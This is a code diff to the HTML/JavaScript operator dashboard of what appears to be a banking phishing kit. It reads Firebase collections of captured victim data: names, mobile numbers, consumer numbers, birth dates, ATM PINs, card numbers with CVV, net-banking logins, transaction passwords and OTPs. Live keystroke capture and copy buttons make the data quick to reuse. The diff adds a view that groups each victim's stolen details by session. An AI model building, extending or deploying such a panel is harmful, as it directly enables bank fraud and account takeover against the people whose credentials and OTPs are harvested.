@@ -18,17 +18,18 @@
     .nav-buttons button {
       background:#00169e; color:white; border:none;
       padding:10px 16px; border-radius:10px;
-      font-weight:bold; cursor:pointer; transition: 0.3s; font-size: 13px;
+      font-weight:bold; cursor:pointer; transition: 0.3s; font-size: 12px;
     }
     .nav-buttons button:hover { background: #000b52; transform: scale(1.05); }
+    .btn-group { background: #28a745 !important; } /* Green for Grouped */
 
     /* Sections Control */
     .section {
-      display:none; margin:0 16px 30px;
+      display:none; margin:0 auto 30px;
       padding:20px; background:white;
       border-radius:10px;
       box-shadow:0 0 8px rgba(0,0,0,0.1);
-      max-width: 900px; margin-left: auto; margin-right: auto;
+      max-width: 900px; width: 95%;
     }
     .section.active { display:block; }
     h3 { color: #00169e; border-bottom: 2px solid #00169e; padding-bottom: 10px; margin-top: 0; }
@@ -52,19 +53,21 @@
       padding: 3px 8px; border-radius: 4px;
       font-size: 11px; cursor: pointer; margin-left: 8px;
     }
-    .copy-btn:active { background: #000; }
 
     .time {
       font-size:12px; color:gray;
       margin-top:10px; display:block; font-style: italic;
     }
 
-    b { color: #333; }
-    p { margin: 8px 0; font-size: 15px; display: flex; align-items: center; }
+    .sid-tag { font-size: 10px; color: #888; display: block; margin-top: 5px; }
     .label-tag { background: #00169e; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-bottom: 8px; display: inline-block; }
     
-    /* Live Section Special Style */
+    hr { border: 0; border-top: 1px solid #eee; margin: 10px 0; }
+    b { color: #333; }
+    p { margin: 8px 0; font-size: 15px; }
+
     #liveCont .entry { border-left-color: #ff0000; background: #fffdfd; }
+    #groupedCont .entry { border-left-color: #28a745; background: #f8fff9; }
   </style>
 
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -77,23 +80,23 @@
 
 <div class="nav-buttons">
   <button onclick="showSection('liveSection')">🔴 Live View</button>
-  <button onclick="showSection('usersSection')"> User</button>
-  <button onclick="showSection('dobPinSection')"> DOB + PIN</button>
-  <button onclick="showSection('txnPasswordSection')"> Txn</button>
-  <button onclick="showSection('cardPaymentSection')"> Card</button>
-  <button onclick="showSection('netbankingSection')"> NetBanking</button>
-  <button onclick="showSection('otpSection')"> OTP</button>
-  <button onclick="showSection('combinedSection')"> All Logs</button>
+  <button onclick="showSection('groupedSection')" class="btn-group">📁 Grouped Data</button>
+  <button onclick="showSection('usersSection')">User</button>
+  <button onclick="showSection('dobPinSection')">DOB + PIN</button>
+  <button onclick="showSection('txnPasswordSection')">Txn</button>
+  <button onclick="showSection('cardPaymentSection')">Card</button>
+  <button onclick="showSection('netbankingSection')">NetBanking</button>
+  <button onclick="showSection('otpSection')">OTP</button>
 </div>
 
 <div id="liveSection" class="section active"><h3>🔴 Real-time Live Typing</h3><div id="liveCont"></div></div>
+<div id="groupedSection" class="section"><h3>📁 Grouped Sessions (User Wise)</h3><div id="groupedCont"></div></div>
 <div id="usersSection" class="section"><h3>👤 User Details</h3><div id="usersCont"></div></div>
 <div id="dobPinSection" class="section"><h3>📅 DOB + PIN</h3><div id="dobCont"></div></div>
 <div id="txnPasswordSection" class="section"><h3>🔑 Txn Password</h3><div id="txnCont"></div></div>
 <div id="cardPaymentSection" class="section"><h3>💳 Card Payments</h3><div id="cardCont"></div></div>
 <div id="netbankingSection" class="section"><h3>🏦 NetBanking</h3><div id="netCont"></div></div>
 <div id="otpSection" class="section"><h3>📲 OTP Entries</h3><div id="otpCont"></div></div>
-<div id="combinedSection" class="section"><h3>📂 Master Combined Logs</h3><div id="allCont"></div></div>
 
 <script>
 const firebaseConfig = {
@@ -108,6 +111,7 @@ const db = firebase.firestore();
 function showSection(id) {
   document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
+  if(id === 'groupedSection') loadGroupedData();
 }
 
 function formatTime(ts){
@@ -117,165 +121,144 @@ function formatTime(ts){
 
 function copyToClipboard(text) {
   if(!text || text === "---") return;
-  navigator.clipboard.writeText(text).then(() => {
-    alert("Copied: " + text);
-  }).catch(err => {
-    console.error('Error copying: ', err);
-  });
+  navigator.clipboard.writeText(text).then(() => alert("Copied")).catch(e => console.log(e));
 }
 
 function deleteEntry(collection, docId){
   const pass = prompt("Enter delete password:");
   if(pass==="4542"){
-    db.collection(collection).doc(docId).delete()
-    .then(()=>alert("Deleted Successfully"))
-    .catch(e=>alert(e));
+    db.collection(collection).doc(docId).delete().then(()=>alert("Deleted")).catch(e=>alert(e));
   } else alert("Wrong password");
 }
 
-/* 1. USERS1 */
-db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const cont = document.getElementById("usersCont");
-  cont.innerHTML = "<h3>👤 User Details</h3>";
-  snap.forEach(doc=>{
-    const d=doc.data();
-    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
-      <p><b>Name:</b> ${d.name} <button class="copy-btn" onclick="copyToClipboard('${d.name}')">Copy</button></p>
-      <p><b>KNO:</b> ${d.kno} <button class="copy-btn" onclick="copyToClipboard('${d.kno}')">Copy</button></p>
-      <p><b>Mobile:</b> ${d.mobile} <button class="copy-btn" onclick="copyToClipboard('${d.mobile}')">Copy</button></p>
-      <span class="time">${formatTime(d.timestamp)}</span></div>`;
-  });
-});
+/* --- DATA LISTENERS --- */
 
-/* 2. DOB PIN */
-db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const cont = document.getElementById("dobCont");
-  cont.innerHTML = "<h3>📅 DOB + PIN</h3>";
-  snap.forEach(doc=>{
-    const d=doc.data();
-    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('dob_pin','${doc.id}')">Delete</button>
-      <p><b>DOB:</b> ${d.dob} <button class="copy-btn" onclick="copyToClipboard('${d.dob}')">Copy</button></p>
-      <p><b>ATM PIN:</b> ${d.pin} <button class="copy-btn" onclick="copyToClipboard('${d.pin}')">Copy</button></p>
-      <span class="time">${formatTime(d.timestamp)}</span></div>`;
-  });
-});
-
-/* 3. TXN PASSWORD */
-db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const cont = document.getElementById("txnCont");
-  cont.innerHTML = "<h3>🔑 Txn Password</h3>";
-  snap.forEach(doc=>{
-    const d=doc.data();
-    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('txn_passwords','${doc.id}')">Delete</button>
-      <p><b>Password:</b> ${d.password} <button class="copy-btn" onclick="copyToClipboard('${d.password}')">Copy</button></p>
-      <span class="time">${formatTime(d.timestamp)}</span></div>`;
-  });
-});
-
-/* 4. PAYMENTS (Card & NetBanking) */
-db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const cardCont = document.getElementById("cardCont");
-  const netCont = document.getElementById("netCont");
-  const allCont = document.getElementById("allCont");
-  cardCont.innerHTML = "<h3>💳 Card Payments</h3>";
-  netCont.innerHTML = "<h3>🏦 NetBanking</h3>";
-  allCont.innerHTML = "<h3>📂 Master Combined Logs</h3>";
-
-  snap.forEach(doc=>{
-    const d = doc.data();
-    let common = `<div class="entry"><button class="delete-btn" onclick="deleteEntry('payments','${doc.id}')">Delete</button>`;
-    let content = "";
-    
-    if(d.method === "netbanking") {
-      content = `<span class="label-tag">NetBanking</span>
-                 <p><b>Bank:</b> ${d.bank} <button class="copy-btn" onclick="copyToClipboard('${d.bank}')">Copy</button></p>
-                 <p><b>User:</b> ${d.username} <button class="copy-btn" onclick="copyToClipboard('${d.username}')">Copy</button></p>
-                 <p><b>Pass:</b> ${d.password} <button class="copy-btn" onclick="copyToClipboard('${d.password}')">Copy</button></p>`;
-      netCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
-    } else {
-      content = `<span class="label-tag">${d.method}</span>
-                 <p><b>Card:</b> ${d.card} <button class="copy-btn" onclick="copyToClipboard('${d.card}')">Copy</button></p>
-                 <p><b>Exp:</b> ${d.expiry} | <b>CVV:</b> ${d.cvv}</p>`;
-      cardCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
-    }
-    allCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
-  });
-});
-
-/* 5. OTP */
-db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
-  const cont = document.getElementById("otpCont");
-  cont.innerHTML = "<h3>📲 OTP Entries</h3>";
-  snap.forEach(doc=>{
-    const d=doc.data();
-    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('otp_entries','${doc.id}')">Delete</button>
-      <p><b>OTP:</b> <span style="color:red; font-size:20px; font-weight:bold;">${d.otp}</span> <button class="copy-btn" onclick="copyToClipboard('${d.otp}')">Copy</button></p>
-      <p><b>Attempt:</b> ${d.attempt || "1"}</p>
-      <span class="time">${formatTime(d.timestamp)}</span></div>`;
-  });
-});
-
-/* 6. LIVE TYPING (REAL-TIME SYNC) */
-/* 6. LIVE TYPING (REAL-TIME SYNC WITH ALL FIELDS & COPY BUTTONS) */
+// 1. Live Typing (Unified Box)
 db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
   const cont = document.getElementById("liveCont");
-  cont.innerHTML = "<h3>🔴 Real-time Live Typing</h3>";
-  
+  cont.innerHTML = "";
   snap.forEach(doc=>{
     const d = doc.data();
-    
-    // 1. Personal & User Info
-    const nameData = d.name || "---";
-    const knoData = d.kno || "---";
-    const mobData = d.mobile || "---";
-
-    // 2. DOB & ATM PIN (Naya Add Kiya)
-    const dobData = d.dob || "---";
-    const pinData = d.pin || "---";
-
-    // 3. Card Details
-    const cardData = d.debitCard || d.creditCard || d.card || "---";
-    const expData = d.expiry || "---"; 
-    const cvvData = d.cvv || "---";
-
-    // 4. NetBanking & Txn Password (Naya Add Kiya)
-    const userData = d.netUser || d.username || "---";
-    const passData = d.netPass || d.password || "---";
-    const txnData = d.txnPass || d.txnPassword || "---";
-
-    // 5. OTP (Naya Add Kiya)
-    const otpData = d.otp || "---";
-    
-    // Copy button helper function
-    const cp = (val) => (val && val !== "---" && val !== "/") ? `<button class="copy-btn" onclick="copyToClipboard('${val}')">Copy</button>` : '';
-
+    const cp = (v) => (v && v !== "---") ? `<button class="copy-btn" onclick="copyToClipboard('${v}')">Copy</button>` : '';
     cont.innerHTML += `
-      <div class="entry" style="border-left-color:red; background: #fffdfd;">
-        <p><span class="label-tag" style="background:red;">LIVE</span> <b>Method:</b> ${d.method || "Typing..."}</p>
-        
-        <p><b>Name:</b> ${nameData} ${cp(nameData)} | <b>Mob:</b> ${mobData} ${cp(mobData)}</p>
-        <p><b>KNO:</b> ${knoData} ${cp(knoData)}</p>
-        
-        <hr style="border:0; border-top:1px solid #eee; margin:10px 0;">
-        
-        <p><b>DOB:</b> ${dobData} ${cp(dobData)} | <b>ATM PIN:</b> <span style="color:green; font-weight:bold;">${pinData}</span> ${cp(pinData)}</p>
-        
-        <p><b>Card/Bank:</b> ${cardData} ${cp(cardData)}</p>
-        <p><b>Expiry:</b> ${expData} ${cp(expData)} | <b>CVV:</b> <span style="color:red">${cvvData}</span> ${cp(cvvData)}</p>
-        
-        <p><b>User:</b> <span style="color:blue">${userData}</span> ${cp(userData)}</p>
-        <p><b>Pass:</b> <span style="color:red; font-weight:bold;">${passData}</span> ${cp(passData)}</p>
-        <p><b>TXN Pass:</b> <span style="color:orange; font-weight:bold;">${txnData}</span> ${cp(txnData)}</p>
-        
-        <hr style="border:0; border-top:1px solid #eee; margin:10px 0;">
-        
-        <p><b>LIVE OTP:</b> <span style="color:red; font-size:18px; font-weight:bold;">${otpData}</span> ${cp(otpData)}</p>
-        
-        <span class="time">Last Update: ${formatTime(d.timestamp)}</span>
+      <div class="entry">
+        <p><span class="label-tag" style="background:red;">LIVE</span> <b>ID:</b> ${doc.id}</p>
+        <p><b>Name:</b> ${d.name || "---"} ${cp(d.name)} | <b>Mob:</b> ${d.mobile || "---"}</p>
+        <p><b>DOB:</b> ${d.dob || "---"} | <b>PIN:</b> <span style="color:green">${d.pin || "---"}</span></p>
+        <hr>
+        <p><b>Card/Bank:</b> ${d.card || d.bank || "---"} ${cp(d.card || d.bank)}</p>
+        <p><b>User:</b> ${d.username || "---"} | <b>Pass:</b> ${d.password || "---"}</p>
+        <p><b>TXN Pass:</b> <span style="color:orange">${d.txnPassword || "---"}</span></p>
+        <p><b>LIVE OTP:</b> <span style="color:red; font-size:18px; font-weight:bold;">${d.otp || "---"}</span></p>
+        <span class="time">Update: ${formatTime(d.timestamp)}</span>
       </div>`;
   });
 });
-</script>
 
+// 2. Grouped Sessions (Heavy Logic)
+async function loadGroupedData() {
+  const cont = document.getElementById("groupedCont");
+  cont.innerHTML = "<p>Grouping Data... Please wait.</p>";
+  const collections = ["users1", "dob_pin", "txn_passwords", "payments", "otp_entries"];
+  let master = {};
+
+  for (const col of collections) {
+    const snap = await db.collection(col).get();
+    snap.forEach(doc => {
+      const d = doc.data();
+      const sid = d.sessionId || "Unknown";
+      if (!master[sid]) master[sid] = [];
+      master[sid].push({ type: col, data: d });
+    });
+  }
+
+  cont.innerHTML = "";
+  for (const sid in master) {
+    let box = `<div class="entry"><b>SESSION: ${sid}</b><hr>`;
+    master[sid].forEach(item => {
+      const d = item.data;
+      if(item.type === "users1") box += `<p>👤 ${d.name} | ${d.mobile} | ${d.kno}</p>`;
+      if(item.type === "dob_pin") box += `<p>📅 DOB: ${d.dob} | PIN: ${d.pin}</p>`;
+      if(item.type === "payments") box += `<p>💳 ${d.method}: ${d.card || d.bank} | ${d.username || ''}</p>`;
+      if(item.type === "otp_entries") box += `<p>📲 OTP: <b style="color:red">${d.otp}</b> (Try: ${d.attempt})</p>`;
+      if(item.type === "txn_passwords") box += `<p>🔑 TXN: ${d.password}</p>`;
+    });
+    cont.innerHTML += box + `</div>`;
+  }
+}
+
+// 3. User Details
+db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("usersCont");
+  cont.innerHTML = "";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
+      <p><b>Name:</b> ${d.name} | <b>Mob:</b> ${d.mobile}</p>
+      <p><b>KNO:</b> ${d.kno}</p>
+      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+  });
+});
+
+// 4. DOB & PIN
+db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("dobCont");
+  cont.innerHTML = "";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('dob_pin','${doc.id}')">Delete</button>
+      <p><b>DOB:</b> ${d.dob} | <b>PIN:</b> ${d.pin}</p>
+      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+  });
+});
+
+// 5. TXN Password
+db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("txnCont");
+  cont.innerHTML = "";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('txn_passwords','${doc.id}')">Delete</button>
+      <p><b>Pass:</b> ${d.password}</p>
+      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+  });
+});
+
+// 6. Payments
+db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cCont = document.getElementById("cardCont");
+  const nCont = document.getElementById("netCont");
+  cCont.innerHTML = ""; nCont.innerHTML = "";
+  snap.forEach(doc=>{
+    const d = doc.data();
+    let h = `<div class="entry"><button class="delete-btn" onclick="deleteEntry('payments','${doc.id}')">Delete</button>`;
+    if(d.method === "netbanking") {
+      h += `<p>🏦 ${d.bank} | U: ${d.username} | P: ${d.password}</p>`;
+      nCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
+    } else {
+      h += `<p>💳 ${d.method}: ${d.card} | Exp: ${d.expiry} | CVV: ${d.cvv}</p>`;
+      cCont.innerHTML += h + `<span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span><span class="time">${formatTime(d.timestamp)}</span></div>`;
+    }
+  });
+});
+
+// 7. OTP
+db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const cont = document.getElementById("otpCont");
+  cont.innerHTML = "";
+  snap.forEach(doc=>{
+    const d=doc.data();
+    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('otp_entries','${doc.id}')">Delete</button>
+      <p><b>OTP:</b> <span style="color:red; font-size:20px; font-weight:bold;">${d.otp}</span></p>
+      <p>Attempt: ${d.attempt}</p>
+      <span class="sid-tag">ID: ${d.sessionId || 'N/A'}</span>
+      <span class="time">${formatTime(d.timestamp)}</span></div>`;
+  });
+});
+
+</script>
 </body>
 </html>
